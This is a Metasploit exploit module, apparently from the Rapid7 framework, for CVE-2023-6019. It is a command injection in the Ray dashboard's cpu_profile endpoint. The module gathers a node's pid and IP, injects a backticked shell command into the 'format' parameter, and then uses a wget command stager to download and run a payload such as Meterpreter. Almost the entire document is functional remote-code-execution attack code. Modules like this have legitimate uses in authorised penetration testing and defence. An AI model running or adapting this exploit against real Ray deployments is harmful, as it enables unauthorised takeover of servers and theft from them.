##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ray cpu_profile command injection',
        'Description' => %q{
          Ray RCE via cpu_profile command injection vulnerability.
        },
        'Author' => [
          'sierrabearchell',                      # Vulnerability discovery
          'byt3bl33d3r <marcello@protectai.com>', # Python Metasploit module
          'Takahiro Yokoyama'                     # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6019'],
          ['URL', 'https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe/'],
          ['URL', 'https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/'],
          ['URL', 'https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/'],
          ['URL', 'https://github.com/protectai/ai-exploits/tree/main/ray']
        ],
        'CmdStagerFlavor' => %i[wget],
        'Payload' => {
          'DisableNops' => true
        },
        'Platform' => %w[linux],
        'Targets' => [
          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ],
          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
          [ 'Linux aarch64', { 'Arch' => ARCH_AARCH64, 'Platform' => 'linux' } ]
        ],
        'DefaultOptions' => { 'MeterpreterTryToFork' => true },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-11-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8265),
        OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2023-6019', ['CVE-2023-6019']]),
        OptString.new('command', [ true, 'The command to execute', 'echo \'Hello from Metasploit\'' ])
      ]
    )
  end

  def get_nodes
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'nodes?view=summary')
    })
    return unless res && res.code == 200

    return JSON.parse(res.body)
  end

  def check
    case datastore['CVE']
    when 'CVE-2023-6019'
      @nodes = get_nodes
      return Exploit::CheckCode::Safe if @nodes.nil?

      return Exploit::CheckCode::Appears
    end
  end

  def exploit
    case datastore['CVE']
    when 'CVE-2023-6019'
      # We need to pass valid node info to /worker/cpu_profile for the server to process the request
      # First we list all nodes and grab the pid and ip of the first one (could be any)
      @nodes ||= get_nodes
      fail_with(Failure::Unknown, 'Failed to get nodes') unless @nodes
      first_node = @nodes['data']['summary'].first
      fail_with(Failure::Unknown, 'Failed to get pid') unless first_node.key?('agent') && first_node['agent'].key?('pid')
      pid = first_node['agent']['pid']
      fail_with(Failure::Unknown, 'Failed to get ip') unless first_node.key?('ip')
      ip = first_node['ip']
      print_good("Grabbed node info, pid: #{pid}, ip: #{ip}")
      opts = { pid: pid, ip: ip }
      res = execute_command(datastore['command'], opts)
      fail_with(Failure::Unknown, 'Failed to execute command') unless res
      print_good("Command execution seems to have been successful. Status code: #{res.code}")
      execute_cmdstager({ flavor: :wget }.merge(opts))
    end
  end

  def execute_command(cmd, opts = {})
    case datastore['CVE']
    when 'CVE-2023-6019'
      return send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'worker/cpu_profile'),
        'vars_get' => {
          'pid' => opts[:pid],
          'ip' => opts[:ip],
          'duration' => 5,
          'native' => 0,
          'format' => "`#{cmd}`"
        }
      })
    end
  end

end
